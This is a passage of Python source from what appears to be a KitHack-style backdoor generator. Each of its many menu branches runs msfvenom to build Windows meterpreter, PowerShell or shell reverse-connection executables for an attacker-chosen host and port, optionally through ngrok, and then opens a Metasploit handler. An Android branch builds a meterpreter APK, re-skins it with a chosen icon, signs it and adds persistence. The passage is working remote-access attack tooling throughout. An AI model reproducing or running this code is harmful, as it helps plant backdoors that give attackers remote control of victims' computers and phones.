						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '08':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '09':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '10':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '11':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/meterpreter/reverse_tcp_dns; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '12':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/metsvc_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/metsvc_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '13':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/powershell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '14':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] OPTION INVALID\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()

		elif sys == '03':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} android/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} android/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} android/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} android/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} android/shell/reverse_http'.format(WHITE, YELLOW))
			print ('{0}[06]{1} android/shell/reverse_https'.format(WHITE, YELLOW))
			print ('{0}[07]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}framework >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}framework >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)
					
					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] Do you want to modify the default name/icon? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "framework - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))
							OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))					
							mainout = os.path.splitext(OUT)[0]	
							var = input("\n{0}[!] Do you want to create persistence to your APK? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT))
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/framework-apk')
							location = os.getcwd()
							if os.path.isfile('output/framework-apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/framework-apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/framework-apk.apk')
